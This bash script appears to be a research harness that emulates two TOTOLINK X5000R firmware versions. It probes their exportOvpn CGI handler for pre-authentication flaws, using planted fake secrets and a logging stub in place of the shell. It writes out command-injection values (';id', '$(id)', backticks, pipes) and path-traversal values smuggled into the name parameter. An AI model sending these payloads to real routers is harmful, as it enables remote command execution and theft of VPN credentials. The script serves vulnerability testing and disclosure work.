#!/usr/bin/env bash
set -euo pipefail

LATEST="/root/inout/firmware/unpacked/totolink/CS_C8344R_X5000R_IP04433_MT7621MT7915_SPI_16M256M_V9.1.0cu.2415_B20250515_ALL/_CS_C8344R_X5000R_IP04433_MT7621MT7915_SPI_16M256M_V9.1.0cu.2415_B20250515_ALL.web.extracted/squashfs-root"
OLD="/root/inout/firmware/unpacked/totolink/TOTOLINK_C8344R_X5000R_IP04433_MT7621MT7915_SPI_16M256M_V9.1.0cu.2350_B20230313_ALL/_TOTOLINK_C8344R_X5000R_IP04433_MT7621MT7915_SPI_16M256M_V9.1.0cu.2350_B20230313_ALL.web.extracted/squashfs-root"
BASE="/root/inout/work/deepdive/exportovpn_versions"

rm -rf "$BASE"
mkdir -p "$BASE"

make_env() {
  local src="$1"
  local dst="$2"
  cp -a "$src" "$dst/rootfs"
  rm -f "$dst/rootfs/var"
  mkdir -p "$dst/rootfs/tmp" "$dst/rootfs/var/cste" "$dst/rootfs/etc/openvpn/server/user" "$dst/rootfs/bin" "$dst/rootfs/usr/bin"
  cat > "$dst/sh_wrapper.c" <<'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv) {
    const char *cmd = NULL;
    for (int i = 1; i + 1 < argc; i++) {
        if (strcmp(argv[i], "-c") == 0) {
            cmd = argv[i + 1];
            break;
        }
    }
    FILE *f = fopen("/tmp/exportovpn_commands.log", "a");
    if (f) {
        fprintf(f, "%s\n", cmd ? cmd : "");
        fclose(f);
    }
    return 0;
}
EOF
  gcc -static -O2 -o "$dst/sh_wrapper" "$dst/sh_wrapper.c"
  rm -f "$dst/rootfs/bin/sh"
  install -m 0755 "$dst/sh_wrapper" "$dst/rootfs/bin/sh"
  cp /usr/bin/qemu-mipsel-static "$dst/rootfs/usr/bin/qemu-mipsel-static"
}

run_case() {
  local dst="$1"
  local name="$2"
  local qs="$3"
  local out="$dst/out_${name}.txt"
  env -i \
    QUERY_STRING="$qs" \
    CONTENT_LENGTH=0 \
    REQUEST_METHOD=GET \
    REMOTE_ADDR=127.0.0.1 \
    PATH="/bin:/usr/bin:/usr/sbin:/sbin" \
    chroot "$dst/rootfs" /usr/bin/qemu-mipsel-static -L / /web/cgi-bin/cstecgi.cgi \
    </dev/null >"$out" 2>&1 || true
  {
    echo "===== $name ====="
    echo "$qs"
    tail -20 "$out"
  } >> "$dst/summary.txt"
}

probe_version() {
  local label="$1"
  local src="$2"
  local dst="$BASE/$label"
  mkdir -p "$dst"
  make_env "$src" "$dst"
  : > "$dst/summary.txt"

  # Fake files prove whether pre-authenticated export returns sensitive OpenVPN material.
  printf 'OVPN_SECRET_FOR_ALICE\n' > "$dst/rootfs/etc/openvpn/server/user/alice.ovpn"
  printf 'TARGZ_SECRET_FOR_ALICE\n' > "$dst/rootfs/etc/openvpn/server/user/alice.tar.gz"
  printf 'TRAVERSAL_SECRET\n' > "$dst/rootfs/etc/openvpn/server/passwd.ovpn"
  printf 'TRAVERSAL_GZ_SECRET\n' > "$dst/rootfs/etc/openvpn/server/passwd.tar.gz"
  printf 'TRAVERSAL_TWO_LEVEL_SECRET\n' > "$dst/rootfs/etc/openvpn/passwd.ovpn"
  printf 'TRAVERSAL_THREE_LEVEL_SECRET\n' > "$dst/rootfs/etc/passwd.ovpn"

  run_case "$dst" benign_cfg 'exportOvpn&type=user&name=alice&mode=config'
  run_case "$dst" benign_gz 'exportOvpn&type=user&name=alice&filetype=gz'
  run_case "$dst" wrong_order 'exportOvpn&name=alice&type=user&mode=config'
  run_case "$dst" semicolon 'exportOvpn&type=user&name=a;id&mode=config'
  run_case "$dst" pipe 'exportOvpn&type=user&name=a|id&mode=config'
  run_case "$dst" backtick 'exportOvpn&type=user&name=a`id`&mode=config'
  run_case "$dst" dollar 'exportOvpn&type=user&name=a$(id)&mode=config'
  run_case "$dst" traversal 'exportOvpn&type=user&name=../passwd&mode=config'
  run_case "$dst" traversal_gz 'exportOvpn&type=user&name=../passwd&filetype=gz'
  run_case "$dst" traversal_encoded 'exportOvpn&type=user&name=..%2fpasswd&mode=config'
  run_case "$dst" traversal_deep 'exportOvpn&type=user&name=../../passwd&mode=config'
  run_case "$dst" traversal_three 'exportOvpn&type=user&name=../../../passwd&mode=config'
  run_case "$dst" absolute_path 'exportOvpn&type=user&name=/etc/passwd&mode=config'

  {
    echo "### $label"
    echo "--- summary ---"
    cat "$dst/summary.txt"
    echo "--- command log ---"
    cat "$dst/rootfs/tmp/exportovpn_commands.log" 2>/dev/null || true
  } | tee "$dst/evidence.txt"
}

probe_version latest "$LATEST"
probe_version old "$OLD"

cat "$BASE/latest/evidence.txt" "$BASE/old/evidence.txt" > "$BASE/combined_evidence.txt"
echo "$BASE/combined_evidence.txt"
